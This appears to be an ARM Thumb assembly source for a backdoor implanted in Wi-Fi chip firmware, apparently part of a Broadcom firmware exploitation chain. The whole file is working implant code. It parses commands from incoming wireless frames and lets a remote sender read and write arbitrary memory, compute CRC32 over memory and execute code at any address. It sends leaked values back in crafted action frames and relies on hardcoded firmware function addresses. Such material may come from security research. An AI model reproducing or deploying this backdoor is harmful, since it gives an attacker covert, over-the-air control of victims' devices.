.syntax unified
.code 16

  PUSH {R4-R11, LR}
  SUB SP, SP, #0x20
  MOV R5, R0            //ctx
  MOV R6, R1            //bsscfg
  MOV R7, R2            //frame data

  //Which command did we receive?
  LDR R0, [R7, #4]
  CMP R0, #1
  BEQ handle_read
  CMP R0, #2
  BEQ handle_execute
  CMP R0, #3
  BEQ handle_crc32
  CMP R0, #4
  BEQ handle_write
  B ret_zero

handle_write:
  LDR R0, [R7, #8]      //dst
  LDR R2, [R7, #12]     //len
  ADD R1, R7, #16       //src
  LDR R4, memcpy
  BLX R4
  B ret_zero

handle_crc32:
  LDR R0, [R7, #8]      //Address
  LDR R1, [R7, #12]     //Length
  MOV R2, #0            //Initial Value
  LDR R4, crc32
  BLX R4

  ADD R1, R7, #16       //Destination MAC 
  MOV R2, R5            //ctx
  MOV R3, R6            //bsscfg
  BL send_frame
  B ret_zero

handle_read:
  LDR R0, [R7, #8]      //Address
  LDR R0, [R0]          //Value
  ADD R1, R7, #16       //Destination MAC 
  MOV R2, R5            //ctx
  MOV R3, R6            //bsscfg
  BL send_frame
  B ret_zero
 
handle_execute: 
   LDR R4, [R7, #8]      //Address
   BLX R4
   B ret_zero

ret_zero:
  MOV R0, #0
  ADD SP, SP, #0x20
  POP {R4-R11, PC}

send_frame:

  //Utility function to send a frame from the backdoor
  //R0 - Leaked Value
  //R1 - Destination MAC
  //R2 - ctx
  //R3 - bsscfg

  PUSH {R4-R11, LR}

  MOV R5, R2            //ctx
  MOV R6, R3            //bsscfg
  MOV R7, R1            //Destination MAC
  MOV R8, R0            //Value

  //Acquiring a frame  
  ADD R0, R6, #136      //BSSID
  MOV R1, #8            //Length
  ADD R2, SP, #0x14
  MOV R3, #4            //Category
  STMEA SP, {R0, R1, R2}  
  
  LDR R0, [R5]          //wlc
  MOV R1, #208          //type = action frame
  MOV R2, R7            //DA
  ADD R3, R6, #142      //SA

  LDR R4, get_frame_func
  BLX R4
  MOV R10, R0           //frame

  //Preparing the frame's contents
  ADD R0, SP, #0x14
  LDR R0, [R0]
  MOV R1, #4
  STRB R1, [R0]         //Category
  MOV R1, #0
  STRB R1, [R0, #1]     //Action
  MOV R1, #0xAB
  STRB R1, [R0, #2]     //Token
  STR R8, [R0, #3]
  
  //Transmitting the frame
  LDR R0, [R5]          //wlc
  MOV R1, R10           //frame
  LDR R2, [R6, #12]
  LDR R2, [R2, #12]
  MOV R3, #0      
  LDR R4, send_frame_func
  BLX R4
  POP {R4-R11, PC}

.align 4

crc32:
  .word 0x4D90+1

memcpy:
  .word 0x3DAC+1

get_frame_func:
  .word 0x4264C+1

send_frame_func:
  .word 0x4FC28+1

